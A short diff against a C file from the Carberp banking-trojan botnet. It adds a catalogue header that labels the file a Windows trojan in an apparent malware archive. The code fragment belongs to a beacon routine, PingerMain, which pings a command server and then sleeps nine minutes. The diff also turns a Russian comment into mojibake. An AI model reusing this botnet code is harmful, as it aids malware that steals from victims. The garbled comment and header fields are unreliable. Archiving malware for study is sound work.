@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -18,7 +29,7 @@ int APIENTRY PingerMain()
 	{
 		PP_DPRINTF(L"PingerMain: pinging server...");
 
-		//160_dp таймер ring3 части
+		//160_dp пїЅпїЅпїЅпїЅпїЅпїЅ ring3 пїЅпїЅпїЅпїЅпїЅ
 		DebugReportStepByName("160_dp");
 
 		PP_DPRINTF(L"PingerMain: sleeping 9 min");
